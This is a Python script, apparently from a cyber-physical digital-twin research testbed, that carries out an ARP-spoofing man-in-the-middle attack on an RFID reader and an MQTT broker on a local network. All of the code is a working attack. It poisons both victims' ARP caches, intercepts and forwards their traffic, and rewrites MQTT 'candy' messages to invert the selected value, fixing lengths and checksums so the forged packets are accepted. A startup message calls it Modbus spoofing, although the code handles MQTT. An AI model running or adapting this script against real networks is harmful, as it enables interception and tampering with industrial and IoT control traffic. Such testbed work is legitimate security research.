#!/usr/bin/env python

from cpstwinning.constants import LOG_FILE_LOC, LOG_LEVEL
from scapy.layers.inet import IP, TCP
from scapy.contrib.mqtt import MQTTPublish
from threading import Thread, Event
from scapy.sendrecv import sniff, srp, send, sendp
from scapy.layers.l2 import ARP, Ether
from time import sleep
import logging

# Setup logger
logging.basicConfig(filename=LOG_FILE_LOC, level=LOG_LEVEL)
logging.getLogger("scapy.runtime").setLevel(logging.DEBUG)
# Do not enable IP Forwarding if you want to modify packets!
# e.g., sysctl -w net.ipv4.ip_forward=0

ARP_SPOOF_TIMER = 10

IFACE = 'enp0s3'

# RFID Reader
VICTIM1_IP = '192.168.0.61'
# MQTT Broker
VICTIM2_IP = '192.168.0.32'

ATTACKER_MAC = '08:00:27:fa:a0:36'

shutdown_event = Event()


def arping(src_ip, dst_ip, dst_mac):
    print "ARPing: {} is at {} [dst_ip={}]".format(src_ip, dst_mac, dst_ip)
    arp = ARP(op=2, psrc=src_ip, pdst=dst_ip, hwdst=dst_mac)
    send(arp, iface=IFACE)


class Sniffer(Thread):

    def __init__(self, victims):
        Thread.__init__(self)
        self.victims = victims

    def process_packet(self, packet):

        # Setting attacker's ARP cache is usually not required
        # conf.netcache.arp_cache[self.victims[0][0]] = self.victims[0][1]
        # conf.netcache.arp_cache[self.victims[1][0]] = self.victims[1][1]

        if Ether in packet:
            if packet[Ether].src == ATTACKER_MAC:
                return

        def alter_packet(pkt):
            if Ether in pkt and IP in pkt:

                l2 = pkt[Ether]
                # Check if RFID reader sent request
                if l2.src == self.victims[0][1] and l2.dst == ATTACKER_MAC:
                    pkt[Ether].src = ATTACKER_MAC
                    pkt[Ether].dst = self.victims[1][1]

                    # Check if MQTT Publish layer in packet
                    if MQTTPublish in pkt:
                        mqtt_pub = pkt[MQTTPublish]
                        topic = mqtt_pub.topic
                        value = mqtt_pub.value
                        length = mqtt_pub.underlayer.len
                        candies = ["Mint", "Cherry"]
                        if topic == "candy":
                            if value in candies:
                                idx = candies.index(value)
                                # Inverse candy selection
                                new_value = candies[(idx + 1) % 2]
                                pkt[MQTTPublish].value = new_value
                                print pkt[MQTTPublish].value
                                pkt[MQTTPublish].underlayer.len = length - len(value) + len(new_value)
                                print pkt[MQTTPublish].underlayer.len

                                # Remove checksum and length of packet
                                if IP in pkt:
                                    del packet[IP].chksum
                                    del packet[IP].len
                                    pkt.show2()

                                # Delete checksum, otherwise server/client impl. may reject packet
                                if TCP in pkt:
                                    del packet[TCP].chksum

                elif l2.src == self.victims[1][1] and l2.dst == ATTACKER_MAC:
                    pkt[Ether].src = ATTACKER_MAC
                    pkt[Ether].dst = self.victims[0][1]
            return pkt

        pk = alter_packet(packet)
        if pk is not None:
            sendp(pk, iface=IFACE, verbose=0)

    def run(self):
        sniff(filter='ip', prn=self.process_packet, store=0, iface=IFACE,
              stop_filter=lambda x: shutdown_event.is_set())
        # Note: The stop_filter function is applied to each packet, meaning that sniffing won't stop if we do not
        # receive any packets. See: https://github.com/secdev/scapy/issues/989
        print "Stopped sniffing."


class ArpSpoofing(Thread):

    def __init__(self, victims):
        Thread.__init__(self)
        self.victims = victims

    def run(self):
        while not shutdown_event.is_set():
            arping(self.victims[0][0], self.victims[1][0], ATTACKER_MAC)
            arping(self.victims[1][0], self.victims[0][0], ATTACKER_MAC)
            sleep(ARP_SPOOF_TIMER)


def get_target_mac_addrs(victim1_ip, victim2_ip):
    def get_mac_addr(target, timeout=2, verbose=None):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target), verbose=verbose, timeout=timeout,
                     iface_hint=target)
        # for send, received in answered
        for _, recv in ans:
            if Ether in recv:
                return recv[Ether].src

    return get_mac_addr(victim1_ip), get_mac_addr(victim2_ip)


def shutdown(victims):
    def rearping():
        arping(victims[0][0], victims[1][0], victims[0][1])
        arping(victims[1][0], victims[0][0], victims[1][1])

    print 'Shutting down... (reARPing victims)'
    rearping()
    shutdown_event.set()


if __name__ == '__main__':
    print "Starting Modbus ARP Spoofing..."
    victims_mac = get_target_mac_addrs(VICTIM1_IP, VICTIM2_IP)
    if victims_mac[0] is None or victims_mac[1] is None:
        print "Could not retrieve MAC addresses of victims."
        exit(-1)
    print victims_mac
    victs = ((VICTIM1_IP, victims_mac[0]), (VICTIM2_IP, victims_mac[1]))
    sniffer = Sniffer(victs)
    sniffer.start()
    arp_spoof = ArpSpoofing(victs)
    arp_spoof.start()
    try:
        while sniffer.is_alive():
            sniffer.join(timeout=1.0)
        while arp_spoof.is_alive():
            arp_spoof.join(timeout=1.0)
    except (KeyboardInterrupt, SystemExit):
        shutdown(victs)
